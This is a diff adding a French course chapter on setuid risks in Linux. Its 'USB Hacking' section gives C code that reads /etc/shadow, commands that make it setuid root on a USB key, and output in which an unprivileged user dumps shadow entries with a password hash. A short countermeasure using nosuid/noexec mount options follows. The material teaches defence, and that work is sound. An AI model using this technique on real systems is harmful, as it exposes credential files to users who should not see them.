@@ -1,9 +1,104 @@
 \chapter{Sécurité des systèmes de fichier}
-La commande ls -la /usr/bin/passw qui retourne
--rwsr-xr-x 1 root root 47032 fév 17  2014 /usr/bin/passwd
 
-Ceci permet à tout utilisateur de changer son mot de passe à l'aide du programme passwd. En effet, grâce au bit Set user ID, l'execution du logiciel passwd change l'utilisateur d'exécution à l'utilisateur propriétaire.
+Surtout système linux, un exécutable qui possède le bit "s" à '1' est très dangereux. Il faut limiter le maximum d'application nécessitant ce bit. Voici un exemple concret, qui montre le danger de l'execution d'un tel programme.
 
-\section{fonctionnement}
--rwsr-Sr-T
-le s minuscule indique que préalablement, l'utilisateur dispose des droits d'exécution sur le fichier. Le S majuscule indique que le groupe ne disposait pas d'exécution du fichier. identique pour T majuscule.
+\section{USB Hacking}
+
+Imaginons un simple programme qui permet de lire le fichier "shadow" afin de pouvoir essayer de cracker les mots de passes.
+
+Voici le code source :
+\begin{lstlisting}[frame=single,style=C]  % Start your code-block
+
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/stat.h>
+
+
+
+int main()
+{
+FILE *pFile;
+char line [128];
+char *p="";
+
+    pFile = fopen ("/etc/shadow", "r");
+    if (pFile)
+    {
+        memset (&line[0], 0, sizeof(line));
+        for (;fgets (&line[0], sizeof(line)-1, pFile);)
+        {
+            printf ("%s", &line[0]);
+            memset (&line[0], 0, sizeof(line));
+        }
+        fclose (pFile);
+    }
+    else
+        printf ("Can not open the /etc/shadow file\n");
+    
+    //execl("./setuid_test", "./setuid_test", NULL);
+    return 0;
+\end{lstlisting}
+
+On le compile, on copie l'exécutable sur la clé USB et on change le bit "s" de ses droits :
+\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block
+
+# cp readShadowArm /media/usb_disk
+# chown root.root readShadowArm
+# chmod u+s readShadowArm
+\end{lstlisting}
+
+Sur la cible on monte la clé USB et on en vérifie les droits :
+\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block
+
+# mkdir /tmpt/t
+# mount -t ext4 /dev/sda2 /tmp/t
+# cd /tmp/t
+# ls -al
+	-rwsrwxrwx    1 root     root          6705 May 21  2015 readShadowArm
+\end{lstlisting}
+
+
+Si on change d'utilisateur ("michael") et on essaie d'accéder à ce fichier :
+\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block
+
+# su michael
+# cat /etc/shadow
+cat: can't open '/etc/shadow': Permission denied
+# ./readShadowArm
+root::10933:0:99999:7:::
+bin:*:10933:0:99999:7:::
+daemon:*:10933:0:99999:7:::
+sync:*:10933:0:99999:7:::
+halt:*:10933:0:99999:7:::
+uucp:*:10933:0:99999:7:::
+operator:*:10933:0:99999:7:::
+ftp:*:10933:0:99999:7:::
+nobody:*:10933:0:99999:7:::
+sshd:*:::::::
+michael:D67tqTzyZ8y7s:15706:0:99999:7:::
+
+\end{lstlisting}
+
+Bingo ! On a réussi à accéder à un fichier protégé à la base. Ceci nous montre le danger de l'exécution d'un tel programme (Il faut toutefois au préalable avoir les droit "root" pour monter la clé).
+
+\section{Contre mesures}
+On peut contrer ce problème en limitant l'exécutions de tels fichier. Pour cela, nous allons modifier les options de montage de "/tmp" dans le fichier "fstab".
+
+\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block
+
+tmpfs   /tmp    tmpfs   rw,nosuid,noexec,nodev   0   0
+\end{lstlisting}
+
+Et si on refait les même manipulations, et que l'on lance le programme en tant que "michael" :
+\begin{lstlisting}[frame=single,style=Bash]  % Start your code-block
+
+# cp readShadowArm ../
+# cd ../
+# ./readShadowArm 
+sh: ./readShadowArm: Permission denied
+\end{lstlisting}
+
+Donc on n'arrive pas à exécuter le fichier binaire, c'est bien ce que l'on à voulu. Par contre, si on exécute le programme directement sur la clé (montée sur "/tmp/t/"), on peut quand même l'exécuter. Ce n'est pas récurrent au point de montage /tmp. Donc, on voit qu'il faut bien faire attention à la sécurité d'un programme possédant le "s" bit activé.
